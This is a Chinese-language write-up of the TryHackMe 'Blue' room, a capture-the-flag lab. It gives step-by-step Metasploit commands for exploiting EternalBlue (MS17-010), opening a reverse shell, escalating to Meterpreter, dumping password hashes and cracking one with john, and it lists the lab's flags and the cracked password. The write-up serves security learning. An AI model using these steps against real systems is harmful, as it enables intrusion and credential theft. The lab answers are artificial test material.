# Blue Writeup
> URL : https://tryhackme.com/room/blue
IP : 10.10.158.118

## Recon
- Q: How many ports are open with a port number under 1000?
	- `nmap -p 1-1000 10.10.158.118`
	- 回傳 3 個
		- 135/tcp open  msrpc
		- 139/tcp open  netbios-ssn
		- 445/tcp open  microsoft-ds
- 老規矩習慣的 `nmap -A 10.10.158.118` 看看
	- ![](https://i.imgur.com/Dxug1il.png)
- Q: What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
	- nmap 看到的 Windows7 版本拿去 Google
		- `windows 7 professional 7601 service pack 1 exploit`
	- 就會出現 `MS17-010` EternalBlue 

## Metasploit
- 開啟 `msfconsole`
	- 搜尋 `search MS17-010`
	- 選擇 `exploit/windows/smb/ms17_010_eternalblue`
- 輸入 `use exploit/windows/smb/ms17_010_eternalblue`
	- 輸入 `show options`
	- 設定需要的 options
		- `set RHOSTS 10.10.158.118`
		- `set LHOST 10.14.7.198`
- 輸入 `set payload windows/x64/shell/reverse_tcp`
- 輸入 `exploit`
	- 成功拿到 shell!
	- ![](https://i.imgur.com/7zwssuS.png)
	- 輸入 `whoami` 可以發現，其實已經是 `system` 權限了

## 使用 Meterpreter
- 存參
	- https://paper.seebug.org/29/
- 簡單來說，Meterpreter是提供給"後滲透"使用
	- 也就是說，比起cmd有更多方便的功能醬子
	- 例如 `getsystem` 可自動提權
	
- Google `shell_to_meterpreter`
	- 取得 `post/multi/manage/shell_to_meterpreter`
- `use post/multi/manage/shell_to_meterpreter`
	- `show options`
	- `set LHOST 10.14.7.198`
	- 確定剛剛我們 ctrl + z 的 session
		- 輸入 `sessions`
		- ![](https://i.imgur.com/6g0oAXX.png)
	- `set SESSION 1`
	- `run`
		- ![](https://i.imgur.com/HkESyhT.png)
- 輸入 `sessions`
	- 可以看到目前有兩個 session
	- ![](https://i.imgur.com/0OfEmDn.png)
	- 選第 2 個 
		- 輸入 `sessions 2`
	- 進入 shell
		- 輸入 `shell`
		- 輸入 `whoami`
			- 確定目前自己是 `nt authority\system`
	- 按下 Ctrl + Z 回到 Meterpreter 選單
		- 輸入 `ps` 觀察目前系統執行的 process
			- ![](https://i.imgur.com/jxtBWA8.png)
		- 尋找最後一個 process
		- ` 3056  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe`
		- 輸入 `migrate 3056` 遷移到 PID 上
- 輸入 `hashdump`
	- 可以看到不同使用者的 hash
		- ![](https://i.imgur.com/ErNJNT7.png)
		- 看起來一般的使用者應該是 Jon
	- 把 `Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::` 存成 txt 用 john 來破
		- `john jon.txt --format=NT --wordlist=/opt/rockyou.txt`
		- 1 秒鐘就爆出來ㄌ `alqfna22`

## 各種 Flag
- Flag1? This flag can be found at the system root.
	- `type flag1.txt`
		- `flag{access_the_machine}`
- Flag2? This flag can be found at the location where passwords are stored within Windows.
	- 他說 Flag 存在 Windows 存密碼的地方
	- Windows 的密碼 hash 存在 `C:\Windows\System32\config`
	- 裡面有 `type flag2.txt` 
		- `flag{sam_database_elevated_access}
- flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
	- 其實我覺得這裡有一點點暴力，但這一題真的有點通靈
	- 已經發現前兩隻 flag 檔名是 `flag1.txt` , `flag2.txt`
	- 所以我想說直接在 C槽 根目錄爆搜
		- `dir flag*.txt /s /p`
		-  ![](https://i.imgur.com/StiISuC.png)
		- 然後就噴出來ㄌ www
		- `flag{admin_documents_can_be_valuable}`
		- 這也提醒我們，可以觀察使用者的 Documents 或 Desktop
			- 但據我所知大多數的台灣人並沒有用 "我的文件" ㄉ習慣 www
